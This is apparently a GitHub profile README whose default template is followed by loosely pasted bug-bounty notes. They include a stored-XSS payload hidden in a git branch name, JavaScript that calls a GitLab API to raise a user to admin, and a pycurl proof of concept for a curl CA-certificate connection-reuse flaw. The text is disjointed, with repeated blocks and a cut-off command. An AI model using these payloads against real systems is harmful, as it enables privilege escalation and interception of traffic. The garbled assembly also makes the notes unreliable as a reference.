- 👋 Hi, I’m @rio-s-molana
- 👀 I’m interested in ...
- 🌱 I’m currently learning ...
- 💞️ I’m looking to collaborate on ...
- 📫 How to reach me ...

<!---
rio-s-molana/rio-s-molana is a ✨ special ✨ repository because its `README.md` (this file) appears on your GitHub profile.
You can click the Preview link to take a look at your changes.
--->
echo "# rio-s-molana" >> README.md 
git init 
git add README.md 
git commit -m "first commit" 
git branch -M main 
git remote add Origin https://github.com/rio-s- molana/rio-s-molana.git
 git push -u asal main
	
<iframe/srcdoc='<script/src=/yvvdwf/data/-/jobs/552156057/artifacts/raw/alert.js></script>'></iframe>, misalnya,git push origin master:"'><iframe/srcdoc='<script/src=/yvvdwf/data/-/jobs/552156057/artifacts/raw/alert.js></script>'></iframe>"

https://gitlab.com/yvvdwf/store-xss-merge-request/-/merge_requests/1
var user_id=5212593;
console.log(`Set user ${user_id} to admin`);

var xhttp = new XMLHttpRequest();
xhttp.onreadystatechange = console.log;
xhttp.open("PUT", `/api/v4/users/${user_id}?admin=true`, true);
xhttp.send();
Improper Control of a Resource Through its Lifetime might fit.
CURLOPT_ISSUERCERT
CURLOPT_PINNEDPUBLICKEY sha256//
cp /etc/ssl/certs/ca-certificates.crt ca.crt
touch CA.crt
curl --capath /dev/null --cacert $PWD/ca.crt https://curl.se --next --capath /dev/null --cacert $PWD/CA.crt https://curl.se

cp /etc/ssl/certs/ca-certificates.crt ca.crt
touch CA.crt
curl --capath /dev/null --cacert $PWD/ca.crt https://curl.se --next --capath /dev/null --cacert $PWD/CA.crt https://curl.se
cp /etc/ssl/certs/ca-certificates.crt ca.crt
touch CA.crt
curl --capath /dev/null --cacert $PWD/ca.crt https://curl.se --next --capath /dev/null --cacert $PWD/CA.crt https://curl.se     blobcmp(data->cert_blob, needle->cert_blob) &&
     blobcmp(data->ca_info_blob, needle->ca_info_blob) &&https://github.com/curl/curl/commit/cac5374298b3e79405bbdabe38941227c73a4c96
https://github.com/curl/curl/commit/cb4e2be7c6d42ca0780f8e0a747cecf9ba45f151
#!/usr/bin/env python3

import pycurl

def main():
    # simulated attacker controlled connection with crafted CA.crt file
    c1 = pycurl.Curl()
    c1.setopt(pycurl.URL, "https://curl.se")
    c1.setopt(pycurl.CAINFO, '/tmp/CA.crt')

    # simulated connection in another security context that the attacker tries to MiTM
    c2 = pycurl.Curl()
    c2.setopt(pycurl.URL, "https://curl.se")
    c2.setopt(pycurl.CAINFO, '/tmp/ca.crt')

    m = pycurl.CurlMulti()
    m.add_handle(c1)

    while True:
        ret, num_handles = m.perform()
        if ret != pycurl.E_CALL_MULTI_PERFORM: break
    while num_handles:
        ret = m.select(1.0)
        if ret == -1: break
        while True:
            ret, num_handles = m.perform()
            if ret != pycurl.E_CALL_MULTI_PERFORM: break

        numq, oklist, errlist = m.info_read(2)
        if c1 in oklist:
            m.add_handle(c2)

if __name__ == "__main__":
    main()openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 to cre
#!/usr/bin/env python3

import pycurl

def main():
    # simulated attacker controlled connection with crafted CA.crt file
    c1 = pycurl.Curl()
    c1.setopt(pycurl.URL, "https://curl.se")
    c1.setopt(pycurl.CAINFO, '/tmp/CA.crt')

    # simulated connection in another security context that the attacker tries to MiTM
    c2 = pycurl.Curl()
    c2.setopt(pycurl.URL, "https://curl.se")
    c2.setopt(pycurl.CAINFO, '/tmp/ca.crt')

    m = pycurl.CurlMulti()
    m.add_handle(c1)

    while True:
        ret, num_handles = m.perform()
        if ret != pycurl.E_CALL_MULTI_PERFORM: break
    while num_handles:
        ret = m.select(1.0)
        if ret == -1: break
        while True:
            ret, num_handles = m.perform()
            if ret != pycurl.E_CALL_MULTI_PERFORM: break

        numq, oklist, errlist = m.info_read(2)
        if c1 in oklist:
            m.add_handle(c2)

if __name__ == "__main__":
    main()
